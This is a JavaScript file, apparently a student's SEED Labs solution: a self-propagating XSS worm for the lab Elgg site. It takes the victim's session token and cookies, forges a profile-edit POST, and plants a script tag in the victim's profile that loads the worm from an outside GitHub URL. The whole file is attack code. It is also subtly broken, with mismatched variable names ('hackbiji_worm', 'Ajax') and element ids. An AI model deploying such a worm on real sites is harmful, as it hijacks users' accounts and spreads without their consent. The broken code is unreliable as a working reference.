var hackbiji_self_worm = document.getElementById("self-propagating-worm").innerHTML;
alert(hackbiji_self_worm);
var user = elgg.session.user.username;
if(user!='hackbiji'){
    var victim = null;
    victim = new XMLHttpRequest();
    if(victim == null)
        alert("victim is null");
    victim.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
    victim.setRequestHeader("Host","www.xsslabelgg.com");
    victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
    victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
    victim.setRequestHeader("Accept-Encoding","gzip, deflate");
    victim.setRequestHeader("Cookie",document.cookie);
    victim.setRequestHeader("Connection","keep-alive");
    victim.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

    var sub_script_begin='<script id="worm" type="text\/javascript">';
    var sub_script_end="<\/script>";
    var sub_script=sub_script_begin.concat(hackbiji_worm,sub_script_end);
    sub_script = escape(sub_script);

    var content="__elgg_token=".concat(elgg.security.token.__elgg_token);
    content = content.concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts);
    content = content.concat("&name=").concat(user);
    content = content.concat("&&briefdescription=<script id='worm' type='text/javascript' src='https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/XSS/worm.js'></script>").concat(sub_script);
    content = content.concat("&guid=").concat(elgg.session.user.guid);

    Ajax.setRequestHeader("Content-Length",content.length);
    Ajax.send(content);
}
